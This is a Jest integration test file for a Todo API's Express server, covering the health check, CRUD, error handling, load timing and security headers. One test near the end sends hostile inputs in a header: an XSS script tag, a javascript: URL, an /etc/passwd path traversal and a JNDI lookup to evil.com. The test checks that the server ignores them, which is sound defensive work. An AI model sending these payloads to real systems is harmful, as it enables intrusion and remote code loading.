const request = require('supertest');
const { app } = require('../../src/app');

describe('Health Check and App Initialization Integration Tests', () => {
  let server;

  beforeAll(() => {
    server = app.listen(0);
  });

  afterAll((done) => {
    if (server) {
      server.close(done);
    } else {
      done();
    }
  });

  describe('GET / - Health Check Endpoint', () => {
    it('should return 200 status for health check', async () => {
      const response = await request(app)
        .get('/')
        .expect(200);

      expect(response.body).toHaveProperty('status');
      expect(response.body).toHaveProperty('message');
      expect(response.body.status).toBe('ok');
      expect(response.body.message).toBe('Todo API server is running');
    });

    it('should return health check with correct content type', async () => {
      const response = await request(app)
        .get('/')
        .expect(200)
        .expect('Content-Type', /json/);

      expect(response.body.status).toBe('ok');
    });

    it('should handle multiple concurrent health check requests', async () => {
      const requests = Array(10).fill().map(() =>
        request(app).get('/')
      );

      const responses = await Promise.all(requests);
      
      responses.forEach(response => {
        expect(response.status).toBe(200);
        expect(response.body.status).toBe('ok');
      });
    });

    it('should return consistent response format', async () => {
      const response = await request(app)
        .get('/')
        .expect(200);

      // Ensure response structure is consistent
      const expectedKeys = ['status', 'message'];
      const actualKeys = Object.keys(response.body);
      
      expectedKeys.forEach(key => {
        expect(actualKeys).toContain(key);
      });

      expect(typeof response.body.status).toBe('string');
      expect(typeof response.body.message).toBe('string');
    });

    it('should respond quickly to health check requests', async () => {
      const startTime = Date.now();
      
      await request(app)
        .get('/')
        .expect(200);
      
      const endTime = Date.now();
      const responseTime = endTime - startTime;
      
      // Health check should be very fast (under 100ms in most cases)
      expect(responseTime).toBeLessThan(1000);
    });
  });

  describe('Server Startup and Configuration', () => {
    it('should have proper middleware configured', async () => {
      // Test CORS by checking headers
      const response = await request(app)
        .get('/')
        .expect(200);

      // CORS headers should be present
      expect(response.headers['access-control-allow-origin']).toBeDefined();
    });

    it('should handle JSON requests properly', async () => {
      const testTaskData = {
        title: 'Health Test JSON Task',
        description: 'Testing JSON parsing'
      };

      const response = await request(app)
        .post('/api/tasks')
        .send(testTaskData)
        .expect(201);

      expect(response.body.title).toBe(testTaskData.title);
      expect(response.body.description).toBe(testTaskData.description);

      // Clean up
      await request(app)
        .delete(`/api/tasks/${response.body.id}`)
        .expect(200);
    });

    it('should handle malformed JSON gracefully', async () => {
      const response = await request(app)
        .post('/api/tasks')
        .send('{"title": "test", invalid json}')
        .set('Content-Type', 'application/json');

      expect(response.status).toBe(400);
    });

    it('should reject requests with incorrect Content-Type', async () => {
      const response = await request(app)
        .post('/api/tasks')
        .send('title=test&description=test')
        .set('Content-Type', 'application/x-www-form-urlencoded');

      // Should fail validation since data won't be parsed as JSON
      expect(response.status).toBe(400);
    });

    it('should handle large request bodies appropriately', async () => {
      const largeData = {
        title: 'Health Test Large Request',
        description: 'A'.repeat(50000) // 50KB description
      };

      const response = await request(app)
        .post('/api/tasks')
        .send(largeData);

      // Should either succeed or fail gracefully with appropriate status
      expect([201, 400, 413].includes(response.status)).toBe(true);

      if (response.status === 201) {
        // Clean up if successful
        await request(app)
          .delete(`/api/tasks/${response.body.id}`)
          .expect(200);
      }
    });
  });

  describe('Error Handling and Resilience', () => {
    it('should handle 404 for non-existent routes', async () => {
      const response = await request(app)
        .get('/non-existent-route')
        .expect(404);

      // Express default 404 handling
      expect(response.status).toBe(404);
    });

    it('should handle 405 for unsupported HTTP methods', async () => {
      const response = await request(app)
        .patch('/') // PATCH not supported on root
        .expect(404); // Express returns 404 for unmatched routes

      expect(response.status).toBe(404);
    });

    it('should handle invalid API endpoints', async () => {
      const response = await request(app)
        .get('/api/invalid-endpoint')
        .expect(404);

      expect(response.status).toBe(404);
    });

    it('should handle missing route parameters', async () => {
      const response = await request(app)
        .get('/api/tasks/')  // Missing ID parameter
        .expect(404); // Express routing will not match

      expect(response.status).toBe(404);
    });

    it('should handle requests with query string on health endpoint', async () => {
      const response = await request(app)
        .get('/?test=value&other=param')
        .expect(200);

      expect(response.body.status).toBe('ok');
    });

    it('should handle requests with headers', async () => {
      const response = await request(app)
        .get('/')
        .set('User-Agent', 'Health-Check-Test')
        .set('X-Custom-Header', 'test-value')
        .expect(200);

      expect(response.body.status).toBe('ok');
    });
  });

  describe('Performance and Load Testing', () => {
    it('should handle rapid successive requests', async () => {
      const requests = [];
      
      for (let i = 0; i < 20; i++) {
        requests.push(request(app).get('/'));
      }

      const responses = await Promise.all(requests);
      
      responses.forEach(response => {
        expect(response.status).toBe(200);
        expect(response.body.status).toBe('ok');
      });
    });

    it('should maintain performance under concurrent load', async () => {
      const concurrentRequests = 50;
      const startTime = Date.now();
      
      const requests = Array(concurrentRequests).fill().map(() =>
        request(app).get('/')
      );

      const responses = await Promise.all(requests);
      const endTime = Date.now();
      const totalTime = endTime - startTime;
      const avgResponseTime = totalTime / concurrentRequests;

      // All requests should succeed
      responses.forEach(response => {
        expect(response.status).toBe(200);
      });

      // Average response time should be reasonable
      expect(avgResponseTime).toBeLessThan(100); // 100ms average
      console.log(`Average response time for ${concurrentRequests} concurrent requests: ${avgResponseTime}ms`);
    });

    it('should handle mixed endpoint requests efficiently', async () => {
      // Create a test task first
      const taskResponse = await request(app)
        .post('/api/tasks')
        .send({ title: 'Health Test Mixed Requests' });

      const taskId = taskResponse.body.id;

      // Mix of different types of requests
      const requests = [
        request(app).get('/'),
        request(app).get('/api/tasks'),
        request(app).get(`/api/tasks/${taskId}`),
        request(app).get('/'),
        request(app).get('/api/tasks?priority=high'),
        request(app).get('/'),
        request(app).get('/api/tasks?search=Health'),
        request(app).get('/')
      ];

      const responses = await Promise.all(requests);
      
      // All requests should succeed
      responses.forEach(response => {
        expect([200, 201].includes(response.status)).toBe(true);
      });

      // Clean up
      await request(app)
        .delete(`/api/tasks/${taskId}`)
        .expect(200);
    });
  });

  describe('App Configuration and Environment', () => {
    it('should have database initialized with sample data', async () => {
      const response = await request(app)
        .get('/api/tasks')
        .expect(200);

      // Should have some initial sample tasks
      expect(response.body.count).toBeGreaterThan(0);
      expect(Array.isArray(response.body.tasks)).toBe(true);
      
      // Sample tasks should have proper structure
      if (response.body.tasks.length > 0) {
        const sampleTask = response.body.tasks[0];
        expect(sampleTask).toHaveProperty('id');
        expect(sampleTask).toHaveProperty('title');
        expect(sampleTask).toHaveProperty('priority');
        expect(sampleTask).toHaveProperty('completed');
      }
    });

    it('should have proper database indexes configured', async () => {
      // Test that filtering queries work efficiently (indexes should be in place)
      const startTime = Date.now();
      
      await request(app)
        .get('/api/tasks?status=completed&priority=high')
        .expect(200);
      
      const endTime = Date.now();
      const queryTime = endTime - startTime;
      
      // Query should be fast due to indexes
      expect(queryTime).toBeLessThan(500);
    });

    it('should handle application lifecycle correctly', async () => {
      // Test that the app can handle startup/shutdown scenarios
      // This is mostly tested by the beforeAll/afterAll hooks
      expect(server).toBeDefined();
      expect(server.listening).toBe(true);
    });

    it('should maintain database consistency', async () => {
      // Create, read, update, delete cycle to test consistency
      const taskData = {
        title: 'Health Test Consistency Check',
        description: 'Testing database consistency'
      };

      // Create
      const createResponse = await request(app)
        .post('/api/tasks')
        .send(taskData)
        .expect(201);

      const taskId = createResponse.body.id;

      // Read
      const readResponse = await request(app)
        .get(`/api/tasks/${taskId}`)
        .expect(200);

      expect(readResponse.body.title).toBe(taskData.title);

      // Update
      const updateData = { title: 'Updated Health Test Task' };
      const updateResponse = await request(app)
        .put(`/api/tasks/${taskId}`)
        .send(updateData)
        .expect(200);

      expect(updateResponse.body.title).toBe(updateData.title);

      // Verify update
      const verifyResponse = await request(app)
        .get(`/api/tasks/${taskId}`)
        .expect(200);

      expect(verifyResponse.body.title).toBe(updateData.title);

      // Delete
      await request(app)
        .delete(`/api/tasks/${taskId}`)
        .expect(200);

      // Verify deletion
      await request(app)
        .get(`/api/tasks/${taskId}`)
        .expect(404);
    });
  });

  describe('Security and Headers', () => {
    it('should not expose sensitive information in headers', async () => {
      const response = await request(app)
        .get('/')
        .expect(200);

      // Check that no sensitive headers are exposed
      expect(response.headers['x-powered-by']).toBeUndefined();
      expect(response.headers['server']).toBeUndefined();
    });

    it('should handle requests without User-Agent', async () => {
      const response = await request(app)
        .get('/')
        .unset('User-Agent')
        .expect(200);

      expect(response.body.status).toBe('ok');
    });

    it('should handle various Content-Type headers appropriately', async () => {
      // Test with JSON
      const jsonResponse = await request(app)
        .post('/api/tasks')
        .send({ title: 'Health Test JSON Content-Type' })
        .set('Content-Type', 'application/json')
        .expect(201);

      // Clean up
      await request(app)
        .delete(`/api/tasks/${jsonResponse.body.id}`)
        .expect(200);
    });

    it('should reject requests with suspicious patterns', async () => {
      // Test with various potentially malicious patterns
      const suspiciousHeaders = [
        'javascript:alert(1)',
        '<script>alert("xss")</script>',
        '../../etc/passwd',
        '${jndi:ldap://evil.com/exploit}'
      ];

      for (const header of suspiciousHeaders) {
        const response = await request(app)
          .get('/')
          .set('X-Test-Header', header)
          .expect(200); // Should still work, but not process the header

        expect(response.body.status).toBe('ok');
      }
    });
  });
});